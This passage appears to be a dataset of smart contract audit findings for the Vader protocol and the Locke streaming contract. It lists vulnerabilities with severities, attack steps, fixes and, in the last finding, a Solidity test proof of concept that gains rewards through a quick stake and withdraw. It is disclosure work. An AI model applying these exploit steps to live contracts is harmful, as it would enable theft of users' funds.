But flash loan attacks are theoretically not limited to the same transaction but to the same block as miners have full control of the block and include several vulnerable transactions back to back. (Think transaction _bundles_ similar to flashbot bundles that most mining pools currently offer.)

A miner can deploy a proxy smart contract relaying all contract calls and call it from a different EOA each time bypassing the `tx.origin` restriction.

The `flashProof` modifier does not serve its purpose.

Recommend trying to apply the modifier to individual addresses that interact with the protocol instead of `tx.origin`.

Furthermore, attacks possible with flash loans are usually also possible for whales, making it debatable if adding flash-loan prevention logic is a good practice."
5.md,Interest debt is capped after a year,medium,"The `Utils.getInterestOwed` function computes the `_interestPayment` as:

```solidity
uint256 _interestPayment =
  calcShare(
      timeElapsed,
      _year,
      getInterestPayment(collateralAsset, debtAsset)
  ); // Share of the payment over 1 year
```

However, `calcShare` caps `timeElpased` to `_year` and therefore the owed interest does not grow after a year has elapsed.

The impact is probably small because the only call so far computes the elapsed time as `block.timestamp - mapCollateralAsset_NextEra[collateralAsset][debtAsset];` which most likely will never go beyond a year.

It's still recommended to fix the logic bug in case more functions will be added that use the broken function.

Recommend using a different function than `calcShare` that does not cap."
5.md,Canceled proposals can still be executed,medium,"Proposals that passed the threshold (""finalized"") can be cancelled by a minority again using the `cancelProposal` functions.
It only sets `mapPID_votes` to zero but `mapPID_timeStart` and `mapPID_finalising` stay the same and pass the checks in `finaliseProposal` which queues them for execution.

Proposals cannot be cancelled.

Recommend setting a cancel flag and check for it in `finaliseProposal` and in execution."
5.md,Completed proposals can be voted on and executed again,medium,"A proposal that is completed has its state reset, including the votes.
Users can just vote on it again and it can be executed again.

Completed proposals should most likely not be allowed to be voted on / executed again.
This could also lead to issues in backend scripts that don't expect any voting/execution events to be fired again after the `FinalisedProposal` event has fired.

Recommend adding an `executed` flag to the proposals and disallow voting/finalising on already executed proposals."
5.md,Divide before multiply,medium,Here you have more information: https://gist.github.com/alexon1234/e5038a9f66136ae210be692f8803d874
5.md,Incorrect operator used in `deploySynth()` of `Pools.sol`,medium,"The `deploySynth()` function in `Pools.sol` is expected to perform a check on the token parameter to determine that it is neither VADER or USDV before calling Factory’s `deploySynth()` function.

However, the `require()` incorrectly uses the ‘||’ operator instead of ‘&&’ which allows both VADER and USDV to be supplied as the token parameters. This will allow an attacker to deploy either VADER or USDV as a Synth which will break assumptions throughout the entire protocol. Protocol will break and funds may be lost.

Recommend changing ‘||’ operator to ‘&&’ in the require statement:
```require(token != VADER && token != USDV);```"
5.md,Allowing duplicated anchors could cause bias on anchor price.,medium,"In `Router.sol`, the setup of the five anchors can be interrupted by anyone adding a new anchor due to the lack of access control of the `listAnchor` function. Also, duplicate anchors are allowed. If the same anchor is added three times, then this anchor biases the result of `getAnchorPrice`.

Referenced code:
[Router.sol#L245-L252](https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L245-L252)

PoC: [Link to PoC](https://drive.google.com/drive/folders/1W3jhlWIIh7FxTLZET3z49yA0DBvlbcPg?usp=sharing)
See the file `200_listAnchor.js` for a PoC of this attack. To run it, use `npx hardhat test 200_listAnchor.js`.

Recommend only allowing `listAnchor` to be called from the deployer by adding a `require` statement. Also, check if an anchor is added before by `require(_isCurated == false)`."
5.md,Transfer fee avoidance,medium,"The `Vether4.addExcluded()` function on mainnet (0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279) allows a user to exclude an address from transfer fees for a cost of 128 VETH. By exploiting the conditions in which fees are taken, it is possible to set up a contract for a once-off cost in which all users can use to avoid transfer fees.

#All transfer fees can be avoided by routing transfers through an excluded contract. An estimated \$140k of transfer fees was accumulated at the time of writing. These fees can be avoided in future, causing an indirect loss of funds for the contract.

Recommend that the `_transfer()` function should be updated to only exclude transfer fees if the sender has been excluded, not both the sender and the recipient. This would prevent any user from being able to set up a central transfer forwarder as demonstrated. Moreover, the `Transfer(_from, address(this), _fee);` event should only be emitted if the sender has been excluded from transfer fees."
5.md,Init function can be called by everyone,medium,"Most of the solidity contracts have an init function that everyone can call.
This could lead to a race condition when the contract is deployed. At that moment a hacker could call the `init` function and make the deployed contracts useless. Then it would have to be redeployed, costing a lot of gas.

```
DAO.sol:    function init(address _vader, address _usdv, address _vault) public {
Factory.sol:    function init(address _pool) public {
Pools.sol:    function init(address _vader, address _usdv, address _router, address _factory) public {
Router.sol:    function init(address _vader, address _usdv, address _pool) public {
USDV.sol:    function init(address _vader, address _vault, address _router) external {
Utils.sol:    function init(address _vader, address _usdv, address _router, address _pools, address _factory) public {
Vader.sol:    function init(address _vether, address _USDV, address _utils) external {
Vault.sol:    function init(address _vader, address _usdv, address _router, address _factory, address _pool) public {
```

Recommend adding a check to the `init` function, for example that only the deployer can call the function."
5.md,Pool functions can be called before initialization in _`init_()` of Pools.sol,medium,"All the external/public functions of `Pools.sol` can be called by other contracts even before `Pools.sol`contract is initialized. This can lead to exceptions, state corruption or incorrect accounting in other contracts, which may require redeployment of said contract.

Recommend using a factory pattern that will deploy and initialize atomically to prevent front-running of the initialization,

OR

Given that contracts are not using `delegatecall` proxy pattern, it is not required to use a separate `init()` function to initialize parameters when the same can be done in a constructor. If the reason for doing so is to get the deployment addresses of the various contracts, which may not all be available at the same time, then consider rearchitecting to create a “globals” contract which can hold all the globally required addresses of various contracts. see [Maple protocol’s](https://github.com/maple-labs/maple-core/blob/develop/contracts/MapleGlobals.sol) for example.

OR

Prevent external/public functions from being called until after initialization is done by checking initialization state tracked by the inited variable."
5.md,`changeDAO` should be a two-step process in Vader.sol,medium,"`changeDAO()` updates DAO address in one-step. If an incorrect address is mistakenly used (and voted upon) then future administrative access or recovering from this mistake is prevented because `onlyDAO` modifier is used for `changeDAO()`, which requires `msg.sender` to be the incorrectly used DAO address (for which private keys may not be available to sign transactions). See [finding #6 from Trail of Bits audit of Hermez Network](https://github.com/trailofbits/publications/blob/master/reviews/hermez.pdf).

Recommend using a two-step process where the old DAO address first proposes new ownership in one transaction; and then, accepts ownership from the newly proposed DAO address in a second transaction. A mistake in the first step can be recovered by granting with a new correct address again before the new DAO address accepts ownership. Ideally, there should also be a timelock enforced before the new DAO takes effect."
5.md,Copy-paste bug leading to incorrect harvest rewards in Vault.sol,medium,"The conditional in `calcReward()` function uses the same code in both if/else parts with repeated use of `reserveUSDV`, `reserveVADER` and `getUSDVAmount` leading to incorrect computed value of `_adjustedReserve` in the else part.

This will affect harvest rewards for all users of the protocol and lead to incorrect accounting. Protocol will break and lead to fund loss.

Recommend changing variables and function calls from using USDV to VADER in the else part of the conditional which has to return the adjusted reserves when synth is not an asset i.e. an anchor and therefore base is VADER. L144 should be changed to:
```uint _adjustedReserve = iROUTER(ROUTER).getVADERAmount(reserveUSDV()) + reserveVADER();```"
5.md,`Vader.redeemToMember()` vulnerable to front running,medium,"The USDV balance of the Vader contract is vulnerable to theft through the `Vader.redeemToMember()` function. A particular case is through USDV redemption front-running. Users can redeem USDV for Vader through the `USDV.redeemForMember()` function or the `Vader.redeemToMember()` function. In the case of `Vader.redeemToMember()`, a user would need to send their USDV to the contract before redemption. However, as this process does not happen in a single call, the victim's call is vulnerable to front running and could have their redeemed USDV stolen by an attacker.

User's redeem USDV could be stolen by an attacker front running their `Vader.redeemToMember()` call.

The steps are as follows:

1) User sends USDV to Vader contract to be redeemed
2) User calls `Vader.redeemToMember()`
3) The `Vader.redeemToMember()` call is detected by an attacker, who front-runs the call by calling `Vader.redeemToMember()` specifying their own address as the member parameter.
4) The full USDV balance of the Vader contract is redeemed and sent to the attacker.

Note that while this particular case is front running a redemption call, any USDV balance could be stolen in this manner. Please find the POC showing the above steps here: https://gist.github.com/toastedsteaksandwich/39bfed78b21d7e6c02fe13ea5b2023c3


Recommend that the `Vader.redeemToMember()` function should be restricted so that only the USDV contract can call it. Moreover, the amount parameter from `USDV.redeem()` or `USDV.redeemForMember()` should also be passed to `Vader.redeemToMember()` to avoid the need to sweep the entire USDV balance. In this way, the member's redemption happens in a single tx, and would only be allocated as much Vader as redeemed in USDV."
5.md,Missing event for critical `init()` function in Factory.sol,low,"The `init()` function initializes critical POOLS protocol address for this contract but is missing an event emission for off-chain monitoring tools to monitor this on-chain change.

Recommend adding an init event and emit that at the end of `init()` function."
5.md,Uninitialized variable leads to zero-fees for first transfer in `Vader.sol`,low,"The state variables `feeOnTransfer` is never initialized which leads to a default uint value of 0. When it is used on L126 in the first call to `_transfer()`, it will lead to a zero fee. `feeOnTransfer` is updated only in function `_checkEmission()` whose call happens later on [L133](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L133), after which it has a value as calculated in that function. This causes only the first transfer to be a zero-fee transfer.

Recommend initializing `feeOnTransfer` suitably on declaration, in constructor, or `init()` function."
5.md,Misleading comment for `deposit()` function of `Vault.sol`,low,"Use of accurate comments helps users read, audit and maintain code. Inaccurate comments can be misleading, obstruct the flagging of vulnerabilities, or even introduce them.

Misleading comment on [L76](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vault.sol#L76-L77) that says `deposit()` function allows USDV and Synths, but the code only allows Synths.

Recommend using accurate and descriptive comments (even NatSpec) correctly describing the function behavior, parameters and return values."
5.md,Fee can be at most 1% and dead code,low,"The `Vader._checkEmission` functions caps the fee at `1000` = 10% but the max fee that can be returned from the `iUTILS(UTILS).getFeeOnTransfer` call is `100`.

```solidity
// returns value between 0 and 100
feeOnTransfer = iUTILS(UTILS).getFeeOnTransfer(
    totalSupply,
    maxSupply
); // UpdateFeeOnTransfer
if (feeOnTransfer > 1000) {
    feeOnTransfer = 1000;
} // Max 10% if UTILS corrupted
```

It seems like there is a misunderstanding in whether the fee should be at most 1% (`Utils.sol`) or 10% (`Vader.sol`).

Recommend clarifying what the max fee should be, and then adjusting either `Utils.getFeeOnTransfer` or the `Vader._checkEmission` cap."
5.md,Lack of zero address validation in `init()` function,low,"The parameters that are used in `init()` function to initialize the state variable, these state variable are used in other function to perform operation. since it lacks zero address validation, it will be problematic if there is error in these state variable. some of the function will loss their functionality which can cause the redeployment of contract.

Recommend adding require condition which check zero address validation"
5.md,Events not emitted,low,Events not emitted for important state changes.
5.md,Swap fee not applied,low,Here you have more information: https://gist.github.com/alexon1234/a2d3619fb3faa4e5676329f70bd565d3
5.md,"The Calculation For `nextEraTime` Drifts, Causing Eras To Occur Further And Further Into The Future",low,"In `Vader.sol`, eras are intended to occur every 24 hours. This means that a correct implementation would add 24 hours to the end-time of the previous era in order to find the end-time of the next era. However, the current method for calculating the next era's end-time uses `block.timestamp`, rather than the previous era's end-time.

This line of code will cause a perpetual drift of era times, causing each era to actually be 24 hours plus the time between when the last era ended and when `Vader._transfer()` is next called.


Recommend that In `Vader.sol`, change this:

`nextEraTime = block.timestamp + secondsPerEra;`

to this:

`nextEraTime = nextEraTime + secondsPerEra;`"
5.md,`_recordBurn` does not handle 0 _eth appropriately,low,"Contract Vether4 function `_recordBurn` does not check that ```_eth > 0```, thus it is possible to pass this check multiple times:

`if (mapEraDay_MemberUnits[_era][_day][_member] == 0)`

If the user hasn't contributed to this day yet, it updates `mapMemberEra_Days`, `mapEraDay_MemberCount`, and `mapEraDay_Members`. However, when `msg.value` is 0, it is possible to trigger this condition again and again as `mapEraDay_MemberUnits` still remains 0.

Recommend either not allowing burns of 0 _eth, or add an extra check in the if statement."
5.md,`getAnchorPrice` potentially returns the wrong median,low,"The `Router.getAnchorPrice` sorts the `arrayPrices` array and always returns the third element `_sortedAnchorFeed[2]`.
This only returns the median if `_sortedAnchorFeed` is of length 5, but it can be anything from `0` to `anchorLimit`.

If not enough anchors are listed initially, it might become out-of-bounds and break all contract functionality due to revert, or return a wrong median. If `anchorLimit` is set to a different value than 5, it's also wrong.

recommend checking the length of `_sortedAnchorFeed` and return `_sortedAnchorFeed[_sortedAnchorFeed.length / 2]` if it's odd, or the average of the two in the middle if it's even."
5.md,`listAnchor` sets `_isCurated` to true but forgets other parts of curation,low,"The function `listAnchor` sets `_isCurated` to true but does not update the `curatedPoolCount` and does not emit the Curated event. I don't see this `curatedPoolCount` variable used anywhere so probably it's just needed for the frontend consumption.

Recommend that the best solution would be to replace ```_isCurated[token] = true```; with call to function `curatePool`. It also skips if the same anchor is listed twice."
5.md,`curatePool` emits Curated event no matter what,low,"The function `curatePool` emits Curated event every time. It should emit this event only when the conditions are fulfilled.

Recommend putting this event inside the most inner `if` block."
5.md,calculations of `upgradedAmount` is not overflow protected,low,"As contract Vether4 is using pragma solidity 0.6.4; SafeMath is not enabled by default, thus making this check inside function distribute avoidable (overflow):

```solidity
upgradedAmount += ownership[i];
require(upgradedAmount <= maxEmissions, ""Must not send more than possible"");
```
Of course, this function can only be called by the deployer (who is later expected to call `purgeDeployer()`) so the issue is only theoretical.

Recommend using SafeMath here or just be informed about this theoretical issue."
5.md,`flashProof` is not effective at the start,low,"In contract USDV, `blockDelay` is not initialized and needs to be explicitly set by calling function `setParams()`. Otherwise, it gets a default value of 0 so `flashProof` is not effective unless the value is set.

It depends on the intentions, you can initialize it in the constructor (or in the `init()` function) or maybe this precaution is intended to be turned on later."
5.md,Token can be burn through transfer,low,"The token can be sent to `address(0)` through a normal `transfer()` without decreasing the `totalSupply` as it would with calling `burn()` and it could cause an unintentional burn.

Recommend consider checking the recipient address to be != `address(0)`."
5.md,You can vote for proposal still not existent,low,"`voteProposal()` doesn't check that ```proposalID <= proposalCount```.

Recommend that in `voteProposal()`, ```require(proposalID <= proposalCount, ""Proposal not existent"")```

It should be ""<="", because `proposalCount` is updated before using it (e.g. https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/DAO.sol#L59) in this way the proposal n. 0 is not assignable, although i'm not sure if it's wanted or not."
5.md,Out-of-bound index access in function `getAnchorPrice`,low,"Out-of-bound index access is possible in the function `getAnchorPrice` of `Router.sol` if the number of anchors equals 1 or 2. Also, the returned anchor price is not the overall median in those situations. [Router.sol#L288](https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L288)

Recommend consider using `arrayPrices.length/2` as the index to get the median of prices."
5.md,ERC20 race condition for allowances,low,"Due to the implementation of the `approve()` function in Vader.sol, Vether.sol and mainnet Vether4 at 0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279, it's possible for a user to over spend their allowance in certain situations.

The steps to the attack are as follows:

1. Alice approves an allowance of 5000 VETH to Bob.
2. Alice attempts to lower the allowance to 2500 VETH.
3. Bob notices the transaction in the mempool and front-runs it by using up the full allowance with a `transferFrom` call.
4. Alice's lowered allowance is confirmed and Bob now has an allowance of 2500 VETH, which can be spent further for a total of 7500 VETH.

Overall, Bob was supposed to be approved for at most 5000 VETH but got 7500 VETH. The POC code can be found here: https://gist.github.com/toastedsteaksandwich/db32472ae5c19c2eb188f07abddd02fa

Note that in the POC, Bob receives 7492.5 VETH instead of 7500 VETH due to transfer fees.

Recommend that instead of having a direct setter for allowances, `decreaseAllowance` and `increaseAllowance` functions should be exposed which decreases and increases allowances for a recipient respectively. In this way, if the `decreaseAllowance` call is front-run, the call should revert as there is insufficient allowance to be decreased. This leaves Bob with at most 5000 VETH, the original allowance."
5.md,Missing input validation may set `rewardAddress` to zero-address in Vader.sol,low,"The function `setRewardAddress` is used by DAO to change `rewardAddress` from USDV to something else. However, there is no zero-address validation on the address. This may accidentally mint rewards to zero-address.

Recommend adding zero-address check to `setRewardAddress`."
5.md,Default value of `curatedPoolLimit` allows only one curated pool in Router.sol,low,"The default value of `curatedPoolLimit` only allows one curated pool at any time. This can be changed with `setParams()` but DAO does not have this functionality.

This will affect the scalability of the protocol and significantly limit the liquidity pool value proposition.

Recommend changeing `curatedPoolLimit` to a higher value on L85."
5.md,`totalBurnt` might be wrong,low,"[Vether.sol](https://etherscan.io/address/0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279#code)
is the 4th contract version. It takes the `totalBurnt` value of the 2nd version of the contract and continues on that.
It seem more logical to use the `totalBurnt` value of the 3rd version of the contract and continue on that. This way, the value of `totalBurnt` is probably not the real value.

```solidity
vether.sol:
contract Vether4 is ERC20 {
 constructor() public {
       ...
        vether2 = 0x01217729940055011F17BeFE6270e6E59B7d0337;                               // Second Vether
        vether3 = 0x75572098dc462F976127f59F8c97dFa291f81d8b;
        ...
        totalBurnt = VETH(vether2).totalBurnt(); totalFees = 0;
```

Recommend checking if indeed vether3 should be used and update the code to use vether3."
5.md,Missing DAO functionality to call `setParams()` function in USDV.sol,low,"`setParams()` is authorized to be called only from the DAO (per modifier) but DAO contract has no corresponding functionality to call `setParams()` function. As a result, `blockDelay` — a critical parameter used to prevent flash attacks, is stuck with initialized value and cannot be changed.

Recommend adding functionality to DAO to be able to call `setParams()` of USDV.sol."
5.md,events can be emitted  even after failed transaction,low,"When a user tries to remove liquidity or initiate a swap, their transaction may fail. But, even though the transaction fails, events can still be emitted. This could be problematic if keeping track of the record off-chain.

In Pools.sol:
* https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L92
* https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L101
* https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L163

In the `_removeLiquidity()`, `swap()`, and `burnSynth()` functions; event is emitted before `transferOut()` function completes. This is because the `transferOut()` function does not check return value from transfer.
As such, the transaction might fail even though the event is emitted.

Recommend checking return value from `transfer()` function in order to know whether transaction was successfully executed or not."
62.md,"Wrong calculation of excess depositToken allows stream creator to retrieve `depositTokenFlashloanFeeAmount`, which may cause fund loss to users",high,"<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654-L654>

```solidity
uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);
```

In the current implementation, `depositTokenFlashloanFeeAmount` is not excluded when calculating `excess` depositToken. Therefore, the stream creator can call `recoverTokens(depositToken, recipient)` and retrieve `depositTokenFlashloanFeeAmount` if there are any.

As a result:

*   When the protocol `governance` calls `claimFees()` and claim accumulated `depositTokenFlashloanFeeAmount`, it may fail due to insufficient balance of depositToken.
*   Or, part of users' funds (depositToken) will be transferred to the protocol `governance` as fees, causing some users unable to withdraw or can only withdraw part of their deposits.

#### Proof of Concept

Given:

*   `feeEnabled`: true
*   `feePercent`: 10 (0.1%)

1.  Alice deposited `1,000,000` depositToken;
2.  Bob called `flashloan()` and borrowed `1,000,000` depositToken, then repaid `1,001,000`;
3.  Charlie deposited `1,000` depositToken;
4.  After `endDepositLock`, Alice called `claimDepositTokens()` and withdrawn `1,000,000` depositToken;
5.  `streamCreator` called `recoverTokens(depositToken, recipient)` and retrieved `1,000` depositToken `(2,000 - (1,001,000 - 1,000,000))`;
6.  `governance` called `claimFees()` and retrieved another `1,000` depositToken;
7.  Charlie tries to `claimDepositTokens()` but since the current balanceOf depositToken is `0`, the transcation always fails, and Charlie loses all the depositToken.

#### Recommendation

Change to:

```solidity
uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - depositTokenFlashloanFeeAmount;
```"
62.md,Tokens can be stolen when `depositToken == rewardToken`,high,"The `Streaming` contract allows the `deposit` and `reward` tokens to be the same token.

> I believe this is intended, think Sushi reward on Sushi as is the case with `xSushi`.

The reward and deposit balances are also correctly tracked independently in `depositTokenAmount` and `rewardTokenAmount`.
However, when recovering tokens this leads to issues as the token is recovered twice, once for deposits and another time for rewards:

```solidity
function recoverTokens(address token, address recipient) public lock {
    // NOTE: it is the stream creators responsibility to save
    // tokens on behalf of their users.
    require(msg.sender == streamCreator, ""!creator"");
    if (token == depositToken) {
        require(block.timestamp > endDepositLock, ""time"");
        // get the balance of this contract
        // check what isnt claimable by either party
        // @audit-info depositTokenAmount updated on stake/withdraw/exit, redeemedDepositTokens increased on claimDepositTokens
        uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);
        // allow saving of the token
        ERC20(token).safeTransfer(recipient, excess);

        emit RecoveredTokens(token, recipient, excess);
        return;
    }
    
    if (token == rewardToken) {
        require(block.timestamp > endRewardLock, ""time"");
        // check current balance vs internal balance
        //
        // NOTE: if a token rebases, i.e. changes balance out from under us,
        // most of this contract breaks and rugs depositors. this isn't exclusive
        // to this function but this function would in theory allow someone to rug
        // and recover the excess (if it is worth anything)

        // check what isnt claimable by depositors and governance
        // @audit-info rewardTokenAmount increased on fundStream
        uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);
        ERC20(token).safeTransfer(recipient, excess);

        emit RecoveredTokens(token, recipient, excess);
        return;
    }
    // ...
```

#### Proof Of Concept

Given `recoverTokens == depositToken`, `Stream` creator calls `recoverTokens(token = depositToken, creator)`.

*   The `token` balance is the sum of deposited tokens (minus reclaimed) plus the reward token amount. `ERC20(token).balanceOf(address(this)) >= (depositTokenAmount - redeemedDepositTokens) + (rewardTokenAmount + rewardTokenFeeAmount)`
*   `if (token == depositToken)` executes, the `excess` from the deposit amount will be the reward amount (`excess >= rewardTokenAmount + rewardTokenFeeAmount`). This will be transferred.
*   `if (token == rewardToken)` executes, the new token balance is just the deposit token amount now (because the reward token amount has been transferred out in the step before). Therefore, `ERC20(token).balanceOf(address(this)) >= depositTokenAmount - redeemedDepositTokens`. If this is non-negative, the transaction does not revert and the creator makes a profit.

Example:

*   outstanding redeemable deposit token amount: `depositTokenAmount - redeemedDepositTokens = 1000`
*   funded `rewardTokenAmount` (plus `rewardTokenFeeAmount` fees): `rewardTokenAmount + rewardTokenFeeAmount = 500`

Creator receives `1500 - 1000 = 500` excess deposit and `1000 - 500 = 500` excess reward.

#### Impact

When using the same deposit and reward token, the stream creator can steal tokens from the users who will be unable to withdraw their profit or claim their rewards.

#### Recommended Mitigation Steps

One needs to be careful with using `.balanceOf` in this special case as it includes both deposit and reward balances.

Add a special case for `recoverTokens` when `token == depositToken == rewardToken` and then the excess should be `ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - (rewardTokenAmount + rewardTokenFeeAmount);`"
62.md,Reward token not correctly recovered,high,"The `Streaming` contract allows recovering the reward token by calling `recoverTokens(rewardToken, recipient)`.

However, the excess amount is computed incorrectly as `ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount)`:

```solidity
function recoverTokens(address token, address recipient) public lock {
    if (token == rewardToken) {
        require(block.timestamp > endRewardLock, ""time"");

        // check what isnt claimable by depositors and governance
        // @audit-issue rewardTokenAmount increased on fundStream, but never decreased! this excess underflows
        uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);
        ERC20(token).safeTransfer(recipient, excess);

        emit RecoveredTokens(token, recipient, excess);
        return;
    }
    // ...
```

Note that `rewardTokenAmount` only ever *increases* (when calling `fundStream`) but it never decreases when claiming the rewards through `claimReward`.
However, `claimReward` transfers out the reward token.

Therefore, the `rewardTokenAmount` never tracks the contract's reward balance and the excess cannot be computed that way.

#### Proof Of Concept

Assume no reward fees for simplicity and only a single user staking.

*   Someone funds `1000` reward tokens through `fundStream(1000)`. Then `rewardTokenAmount = 1000`
*   The stream and reward lock period is over, i.e. `block.timestamp > endRewardLock`
*   The user claims their full reward and receives `1000` reward tokens by calling `claimReward()`. The reward contract balance is now `0` but `rewardTokenAmount = 1000`
*   Some fool sends 1000 reward tokens to the contract by accident. These cannot be recovered as the `excess = balance - rewardTokenAmount = 0`

#### Impact

Reward token recovery does not work.

#### Recommended Mitigation Steps

The claimed rewards need to be tracked as well, just like the claimed deposits are tracked.
I think you can even decrease `rewardTokenAmount` in `claimReward` because at this point `rewardTokenAmount` is not used to update the `cumulativeRewardPerToken` anymore."
62.md,Improper implementation of `arbitraryCall()` allows protocol gov to steal funds from users' wallets,high,"<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733-L735>

```solidity
function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {
    // cannot have an active incentive for the callee
    require(incentives[who] == 0, ""inc"");
    ...
```

When an incentiveToken is claimed after `endStream`, `incentives[who]` will be `0` for that `incentiveToken`.

If the protocol gov is malicious or compromised, they can call `arbitraryCall()` with the address of the incentiveToken as `who` and `transferFrom()` as calldata and steal all the incentiveToken in the victim's wallet balance up to the allowance amount.

#### Proof of Concept

1.  Alice approved `USDC` to the streaming contract;
2.  Alice called `createIncentive()` and added `1,000 USDC` of incentive;
3.  After the stream is done, the stream creator called `claimIncentive()` and claimed `1,000 USDC`;

The compromised protocol gov can call `arbitraryCall()` and steal all the USDC in Alice's wallet balance.

#### Recommendation

Consider adding a mapping: `isIncentiveToken`, setting `isIncentiveToken[incentiveToken] = true` in `createIncentive()`, and `require(!isIncentiveToken[who], ...)` in `arbitraryCall()`."
62.md,Possible incentive theft through the arbitraryCall() function,high,"#### Impact

The `Locke.arbitraryCall()` function allows the inherited governance contract to perform arbitrary contract calls within certain constraints. Contract calls to tokens provided as incentives through the createIncentive() function are not allowed if there is some still some balance according to the incentives mapping (See line 735 referenced below).

However, the token can still be called prior any user creating an incentive, so it's possible for the `arbitraryCall()` function to be used to set an allowance on an incentive token before the contract has actually received any of the token through `createIncentive()`.

In summary:

1.  If some possible incentive tokens are known prior to being provided, the `arbitraryCall()` function can be used to pre-approve a token allowance for a malicious recipient.
2.  Once a user calls `createIncentive()` and provides one of the pre-approved tokens, the malicious recipient can call `transferFrom` on the provided incentive token and withdraw the tokens.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735>

#### Recommended Mitigation Steps

##### Recommendation 1

Limit the types of incentive tokens so it can be checked that it's not the target contract for the arbitraryCall().

##### Recommendation 2

Validate that the allowance of the target contract (if available) has not changed."
62.md,Creating rewardTokens without streaming depositTokens,high,"#### Impact

`stake` and `withdraws` can generate rewardTokens without streaming depositTokens.
It does not matter whether the stream is a sale or not.

The following lines can increase the reward balance on a `withdraw` some time after `stake`:
<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L219:L222>

    // accumulate reward per token info
    cumulativeRewardPerToken = rewardPerToken();

    // update user rewards
    ts.rewards = earned(ts, cumulativeRewardPerToken);

While the following line can be gamed in order to not stream any tokens (same withdraw tx).

Specifically an attacker can arrange to create a fraction less than zero thereby substracting zero.

<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229>

    ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
    // WARDEN TRANSLATION: (elapsedSecondsSinceStake * stakeAmount) / (endStreamTimestamp - stakeTimestamp)

A succesful attack increases the share of rewardTokens of the attacker.

The attack can be repeated every block increasing the share further.
The attack could be done from multiple EOA increasing the share further.
In short: Attackers can create loss of funds for (honest) stakers.

The economic feasability of the attack depends on:

*   staked amount (times number of attacks) vs total staked amount
*   relative value of rewardToken to gasprice

#### Proof of Concept

##### code

The following was added to `Locke.t.sol` for the `StreamTest` Contract to simulate the attack from one EOA.
```solidity
function test_quickDepositAndWithdraw() public {
    //// SETUP
    // accounting (to proof attack): save the rewardBalance of alice.
    uint StartBalanceA = testTokenA.balanceOf(address(alice));
    uint112 stakeAmount = 10_000;

    // start stream and fill it
    (
        uint32 maxDepositLockDuration,
        uint32 maxRewardLockDuration,
        uint32 maxStreamDuration,
        uint32 minStreamDuration
    ) = defaultStreamFactory.streamParams();

    uint64 nextStream = defaultStreamFactory.currStreamId();
    Stream stream = defaultStreamFactory.createStream(
        address(testTokenA),
        address(testTokenB),
        uint32(block.timestamp + 10), 
        maxStreamDuration,
        maxDepositLockDuration,
        0,
        false
        // false,
        // bytes32(0)
    );
    
    testTokenA.approve(address(stream), type(uint256).max);
    stream.fundStream(1_000_000_000);

    // wait till the stream starts
    hevm.warp(block.timestamp + 16);
    hevm.roll(block.number + 1);

    // just interact with contract to fill ""lastUpdate"" and ""ts.lastUpdate"" 
// without changing balances inside of Streaming contract
    alice.doStake(stream, address(testTokenB), stakeAmount);
    alice.doWithdraw(stream, stakeAmount);


    ///// ATTACK COMES HERE
    // stake
    alice.doStake(stream, address(testTokenB), stakeAmount);

    // wait a block
    hevm.roll(block.number + 1);
    hevm.warp(block.timestamp + 16);

    // withdraw soon thereafter
    alice.doWithdraw(stream, stakeAmount);

    // finish the stream
    hevm.roll(block.number + 9999);
    hevm.warp(block.timestamp + maxDepositLockDuration);

    // get reward
    alice.doClaimReward(stream);


    // accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken
    uint EndBalanceA = testTokenA.balanceOf(address(alice));
    uint EndBalanceB = testTokenB.balanceOf(address(alice));

    // Stream returned everything we gave it
    // (doStake sets balance of alice out of thin air => we compare end balance against our (thin air) balance)
    assert(stakeAmount == EndBalanceB);

    // we gained reward token without risk
    assert(StartBalanceA == 0);
    assert(StartBalanceA < EndBalanceA);
    emit log_named_uint(""alice gained"", EndBalanceA);
}
```

##### commandline

```zsh
    dapp test --verbosity=2 --match ""test_quickDepositAndWithdraw"" 2> /dev/null
    Running 1 tests for src/test/Locke.t.sol:StreamTest
    [PASS] test_quickDepositAndWithdraw() (gas: 4501209)

    Success: test_quickDepositAndWithdraw

      alice gained: 13227
```
#### Tools Used

dapptools

#### Recommended Mitigation Steps

Ensure staked tokens can not generate reward tokens without streaming deposit tokens. First idea that comes to mind is making following line
`https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L220`
dependable on a positive amount > 0 of:
`https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229`"
